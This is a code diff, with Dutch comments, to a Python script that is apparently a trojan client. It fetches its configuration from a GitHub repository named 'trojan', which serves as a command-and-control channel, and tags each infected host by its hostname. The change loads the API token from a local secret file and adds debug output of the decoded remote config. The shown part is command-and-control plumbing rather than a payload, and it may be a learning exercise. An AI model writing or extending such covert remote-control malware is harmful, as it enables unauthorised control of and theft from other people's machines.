@@ -10,10 +10,12 @@ from config import GITHUB_TOKEN
 
 # Haal de hostname van het systeem op
 hostname = socket.gethostname()
+with open("accesToken.secret", 'r') as file:
+    token = file.read().strip() 
 
 # Configuratie van de GitHub-repository
 GITHUB_REPO = "https://api.github.com/repos/GerbenVandeVelde/trojan"  # Vervang met jouw repo
-ACCESS_TOKEN = f"token {GITHUB_TOKEN}"  # Voeg je eigen token toe
+ACCESS_TOKEN = token  # Voeg je eigen token toe
 CLIENT_ID = hostname
 
 # Basisheaders voor API-verzoeken
@@ -27,9 +29,12 @@ def fetch_config():
     try:
         url = f"{GITHUB_REPO}/contents/config/config.json"
         response = requests.get(url, headers=HEADERS)
+        print(f"Response Status Code: {response.status_code}")  # Add this line to log the status code
+
         if response.status_code == 200:
             content = response.json()["content"]
             decoded_content = base64.b64decode(content).decode("utf-8")
+            print(f"Decoded Config: {decoded_content}")  # Log the decoded content for debugging
             config = json.loads(decoded_content)
             return config
         else:
